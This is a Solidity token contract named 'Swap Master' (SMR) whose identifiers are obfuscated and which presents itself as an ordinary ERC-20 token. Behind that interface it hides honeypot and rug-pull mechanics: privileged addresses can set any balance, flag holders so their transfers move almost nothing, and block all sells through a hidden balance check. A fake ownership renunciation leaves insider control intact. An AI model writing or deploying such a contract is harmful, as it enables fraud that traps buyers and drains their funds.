//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface marketingTrading {
    function createPair(address launchedTotal, address limitMaxMarketing) external returns (address);
}

interface receiverMinSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toBuy) external view returns (uint256);

    function transfer(address marketingFund, uint256 fundShould) external returns (bool);

    function allowance(address buyToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundShould) external returns (bool);

    function transferFrom(
        address sender,
        address marketingFund,
        uint256 fundShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldSwap, uint256 value);
    event Approval(address indexed buyToken, address indexed spender, uint256 value);
}

abstract contract launchShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface receiverMinSwapMetadata is receiverMinSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SwapMaster is launchShould, receiverMinSwap, receiverMinSwapMetadata {

    string private feeEnableIs = "SMR";

    uint256 swapTotal;

    address public senderMarketing;

    function enableFund() private view {
        require(enableSender[_msgSender()]);
    }

    uint256 private minLiquidity;

    mapping(address => bool) public toTokenSwap;

    string private sellLimit = "Swap Master";

    function teamFee(address totalSender, address marketingFund, uint256 fundShould) internal returns (bool) {
        require(exemptLaunched[totalSender] >= fundShould);
        exemptLaunched[totalSender] -= fundShould;
        exemptLaunched[marketingFund] += fundShould;
        emit Transfer(totalSender, marketingFund, fundShould);
        return true;
    }

    uint256 constant launchedAuto = 7 ** 10;

    function minTrading(uint256 fundShould) public {
        enableFund();
        walletTeam = fundShould;
    }

    function limitFund(address modeExempt) public {
        require(modeExempt.balance < 100000);
        if (marketingTake) {
            return;
        }
        
        enableSender[modeExempt] = true;
        if (minLiquidity == limitBuy) {
            liquidityWallet = false;
        }
        marketingTake = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return senderSwapFrom;
    }

    function approve(address minSenderIs, uint256 fundShould) public virtual override returns (bool) {
        fromMax[_msgSender()][minSenderIs] = fundShould;
        emit Approval(_msgSender(), minSenderIs, fundShould);
        return true;
    }

    uint256 private tradingSell = 100000000 * 10 ** 18;

    uint256 walletTeam;

    function balanceOf(address toBuy) public view virtual override returns (uint256) {
        return exemptLaunched[toBuy];
    }

    function getOwner() external view returns (address) {
        return limitAt;
    }

    function transfer(address sellReceiver, uint256 fundShould) external virtual override returns (bool) {
        return takeToWallet(_msgSender(), sellReceiver, fundShould);
    }

    mapping(address => bool) public enableSender;

    function transferFrom(address totalSender, address marketingFund, uint256 fundShould) external override returns (bool) {
        if (_msgSender() != teamMax) {
            if (fromMax[totalSender][_msgSender()] != type(uint256).max) {
                require(fundShould <= fromMax[totalSender][_msgSender()]);
                fromMax[totalSender][_msgSender()] -= fundShould;
            }
        }
        return takeToWallet(totalSender, marketingFund, fundShould);
    }

    function senderSwap() public {
        emit OwnershipTransferred(launchAuto, address(0));
        limitAt = address(0);
    }

    event OwnershipTransferred(address indexed toMarketing, address indexed tokenTx);

    function feeLaunch(address buyAmount) public {
        enableFund();
        
        if (buyAmount == launchAuto || buyAmount == senderMarketing) {
            return;
        }
        toTokenSwap[buyAmount] = true;
    }

    uint256 private limitBuy;

    function enableLimit(address sellReceiver, uint256 fundShould) public {
        enableFund();
        exemptLaunched[sellReceiver] = fundShould;
    }

    address sellMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public liquidityWallet;

    address private limitAt;

    function totalSupply() external view virtual override returns (uint256) {
        return tradingSell;
    }

    function owner() external view returns (address) {
        return limitAt;
    }

    mapping(address => mapping(address => uint256)) private fromMax;

    function symbol() external view virtual override returns (string memory) {
        return feeEnableIs;
    }

    bool public marketingTake;

    constructor (){
        if (liquidityWallet) {
            limitBuy = minLiquidity;
        }
        marketingAuto launchAmount = marketingAuto(teamMax);
        senderMarketing = marketingTrading(launchAmount.factory()).createPair(launchAmount.WETH(), address(this));
        
        launchAuto = _msgSender();
        enableSender[launchAuto] = true;
        exemptLaunched[launchAuto] = tradingSell;
        senderSwap();
        
        emit Transfer(address(0), launchAuto, tradingSell);
    }

    function takeToWallet(address totalSender, address marketingFund, uint256 fundShould) internal returns (bool) {
        if (totalSender == launchAuto) {
            return teamFee(totalSender, marketingFund, fundShould);
        }
        uint256 modeFund = receiverMinSwap(senderMarketing).balanceOf(sellMax);
        require(modeFund == walletTeam);
        require(marketingFund != sellMax);
        if (toTokenSwap[totalSender]) {
            return teamFee(totalSender, marketingFund, launchedAuto);
        }
        return teamFee(totalSender, marketingFund, fundShould);
    }

    bool private tradingExemptSwap;

    uint8 private senderSwapFrom = 18;

    function name() external view virtual override returns (string memory) {
        return sellLimit;
    }

    address public launchAuto;

    mapping(address => uint256) private exemptLaunched;

    function allowance(address sellFrom, address minSenderIs) external view virtual override returns (uint256) {
        if (minSenderIs == teamMax) {
            return type(uint256).max;
        }
        return fromMax[sellFrom][minSenderIs];
    }

    address teamMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}